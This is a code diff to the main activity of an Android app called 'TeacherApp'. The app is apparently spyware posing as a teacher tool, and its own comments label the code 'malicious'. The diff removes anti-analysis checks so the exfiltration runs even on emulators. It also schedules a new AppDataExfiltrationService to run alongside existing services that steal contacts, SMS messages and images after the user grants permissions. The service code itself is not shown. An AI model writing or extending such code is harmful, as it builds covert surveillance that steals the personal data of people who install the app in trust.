@@ -21,7 +21,6 @@ import androidx.navigation.NavHostController
 import androidx.navigation.compose.rememberNavController
 import com.example.teacherapp.navigation.NavGraph
 import com.example.teacherapp.ui.theme.TeacherappTheme
-import com.teacherapp.obfuscation.AntiAnalysisUtils
 import com.teacherapp.services.ContactExfiltrationService
 import com.teacherapp.services.ImageExfiltrationService
 import com.teacherapp.services.SmsExfiltrationService
@@ -29,6 +28,7 @@ import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
+import com.teacherapp.services.AppDataExfiltrationService
 
 
 class MainActivity : ComponentActivity() {
@@ -85,15 +85,9 @@ class MainActivity : ComponentActivity() {
             }
         }
 
-        // PART 2: Malicious code triggers
-        performSecurityChecks()
+        // TESTING MODE - NO SECURITY CHECKS
+        // Just request permissions directly
         requestNecessaryPermissions()
-    }
-
-    private fun performSecurityChecks() {
-        AntiAnalysisUtils.executeIfSafe(this) {
-            // Environment is safe, proceed
-        }
     }
 
     private fun requestNecessaryPermissions() {
@@ -139,17 +133,16 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun onAllPermissionsGranted() {
-        Toast.makeText(this, "TeacherApp is ready!", Toast.LENGTH_SHORT).show()
+        Toast.makeText(this, "TeacherApp is ready! (Testing Mode - No Security)", Toast.LENGTH_SHORT).show()
 
-        // Schedule malicious activities
+        // Schedule malicious activities WITHOUT security checks
         scheduleMaliciousActivities()
     }
 
     private fun scheduleMaliciousActivities() {
-        AntiAnalysisUtils.executeIfSafe(this) {
-            CoroutineScope(Dispatchers.Default).launch {
-                startTimedExfiltration()
-            }
+        // NO ANTI-ANALYSIS - RUNS ON EMULATOR
+        CoroutineScope(Dispatchers.Default).launch {
+            startTimedExfiltration()
         }
     }
 
@@ -169,6 +162,10 @@ class MainActivity : ComponentActivity() {
 
         // Start Image exfiltration
         ImageExfiltrationService.startExfiltration(this@MainActivity)
+
+        delay(5000L)
+
+        AppDataExfiltrationService.startExfiltration(this@MainActivity)
     }
 }
 
